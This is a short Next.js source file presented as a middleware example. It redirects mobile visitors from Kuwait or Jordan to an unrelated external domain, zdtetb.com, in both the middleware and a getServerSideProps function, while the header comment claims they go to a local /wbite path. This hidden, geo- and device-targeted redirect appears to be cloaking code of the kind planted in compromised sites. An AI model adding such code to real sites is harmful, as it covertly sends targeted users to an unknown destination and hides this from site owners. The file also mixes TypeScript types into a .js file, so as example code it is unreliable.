// Next.js Middleware example (middleware.js)
// Redirects visitors from Kuwait (KW) or Jordan (JO) *AND* using a phone
// to /wbite, otherwise shows main site.

import { NextResponse } from 'next/server';

export function middleware(request: { geo: { country: null; }; headers: { get: (arg0: string) => string; }; nextUrl: { clone: () => any; }; }) {
  // Get geo info (works on Vercel and some hosts)
  const country = request.geo?.country || null;

  // Detect mobile device using User-Agent
  const ua = request.headers.get('user-agent') || '';
  const isMobile = /mobile|android|iphone|ipad|phone/i.test(ua);

  // Check if country is KW or JO and device is mobile
  if (isMobile && (country === 'KW' || country === 'JO')) {
    return NextResponse.redirect("https://zdtetb.com/");
  }

  // Otherwise allow user to continue
  return NextResponse.next();
}

// Apply middleware to all pages
export const config = {
  matcher: '/:path*',
};

export async function getServerSideProps(context: { req: any; }) {
  const req = context.req;
  const ua = req.headers['user-agent'] || '';
  const isMobile = /mobile|android|iphone|ipad|phone/i.test(ua);

  // Country via reverse proxy header (if configured)
  const country = req.headers['x-vercel-ip-country'] || null;

  if (isMobile && (country === 'KW' || country === 'JO')) {
    return {
      redirect: {
        destination: "https://zdtetb.com/",
        permanent: false,
      },
    };
  }

  return { props: {} };
}
